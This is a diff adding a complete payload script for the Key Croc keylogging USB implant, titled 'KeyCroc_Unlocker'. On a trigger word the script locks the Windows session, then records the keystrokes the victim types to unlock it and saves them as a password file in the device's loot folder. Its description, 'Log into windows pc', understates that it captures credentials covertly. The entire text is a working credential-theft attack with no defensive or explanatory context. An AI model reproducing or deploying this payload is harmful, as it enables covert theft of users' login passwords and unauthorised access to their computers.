@@ -1,0 +1,11 @@
+# Title:           KeyCroc_Unlocker   
+# Description:     Log into windows pc
+# Author:          spywill / RootJunky
+# Version:         1.0
+# Category:        Key Croc
+#
+#
+MATCH crocunlocker
+sleep 1
+Q GUI-l
+SAVEKEYS /root/udisk/loot/mypass.txt UNTIL ENTER
